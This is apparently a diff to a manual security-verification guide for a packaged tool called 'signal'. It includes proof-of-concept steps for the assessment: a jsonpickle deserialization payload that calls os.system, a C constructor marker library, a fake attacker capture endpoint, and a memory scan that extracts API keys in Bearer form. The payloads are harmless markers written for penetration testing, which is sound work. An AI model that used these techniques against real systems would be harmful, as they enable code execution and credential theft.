@@ -18,6 +18,8 @@ sudo apt update && sudo apt install -y gcc python3-venv binutils
 mkdir -p ~/vapt-manual && cd ~/vapt-manual
 cp ~/VAPT/signal-pyarmor-linux-x86_64 . && chmod +x signal-pyarmor-linux-x86_64
 # if you don't have the binary yet, see REPRODUCTION-GUIDE.md §0.2 (binary-drop branch)
+# shortcut: a ready-made copy of this repo fixture is in fixtures/evil-repo/
+#           (the point of manual verification is building it by hand, though)
 
 export B=~/vapt-manual/signal-pyarmor-linux-x86_64
 sha256sum $B      # expect 47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744b0641c7d915
@@ -27,7 +29,7 @@ sha256sum $B      # expect 47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744
 
 ```bash
 cd ~/vapt-manual
-python3 ~/VAPT/repro/capture_endpoint.py --port 8899 --log attacker-endpoint-log.jsonl
+python3 ~/VAPT/manual-verification/capture_endpoint.py --port 8899 --log attacker-endpoint-log.jsonl
 # capture endpoint listening on http://127.0.0.1:8899/v1
 ```
 
@@ -158,6 +160,7 @@ Bonus (managed endpoint embedded in the binary): `strings -a $B | grep -m1 llm.c
 
 ```bash
 cd ~/vapt-manual
+cp ~/VAPT/manual-verification/payloads/import{1,2}.json .   # shortcut (or type them out below)
 cat > import1.json <<'EOF'
 {"py/object": "os.system", "py/newargs": ["touch /tmp/vapt-manual/PWNED_MARKER"]}
 EOF
@@ -215,6 +218,7 @@ stat -c '%a %n' results.sarif signal-cache.db signal.log signal_errors.json
 
 ```bash
 cd ~/vapt-manual
+cp ~/VAPT/manual-verification/payloads/marker.c .    # shortcut (or type it out below)
 cat > marker.c <<'EOF'
 #include <stdio.h>
 __attribute__((constructor)) static void vapt_marker(void) {
@@ -249,7 +253,7 @@ tr '\0' ' ' < /proc/$(pgrep -f signal-pyarmor | tail -1)/cmdline
 
 **(b) memory — includes the ready-to-send Bearer form:**
 ```bash
-sudo python3 ~/VAPT/repro/memscan.py $(pgrep -f signal-pyarmor | tail -1) sk-poc-manual-memkey
+sudo python3 ~/VAPT/manual-verification/memscan.py $(pgrep -f signal-pyarmor | tail -1) sk-poc-manual-memkey
 ```
 Validated output (4 hits in the app child, 276 regions scanned):
 ```
@@ -343,5 +347,8 @@ ls -ld /tmp/_MEI*     # drwx------  -> per-run temp dir is owner-only ✓
 | V-13 | plaintext cache | sqlite schema dump | `full_llm_cache(prompt,…)` | ☐ |
 | V-14 | bundle plaintext | ls extracted | prompts/profiles/rules/tests/dist-info | ☐ |
 
-Files referenced: `repro/capture_endpoint.py` (fake LLM endpoint), `repro/memscan.py`
-(memory scanner). Automated alternative: `repro/run_all_pocs.py` (all of the above in one command).
+Files referenced: `manual-verification/capture_endpoint.py` (fake LLM endpoint),
+`manual-verification/memscan.py` (memory scanner), `manual-verification/fixtures/evil-repo/`
+(ready-made malicious repo — same content you build by hand above),
+`manual-verification/payloads/` (marker.c, import1.json, import2.json).
+Automated alternative: `python3 repro/run_all_pocs.py` from the repo root (all of the above in one command).
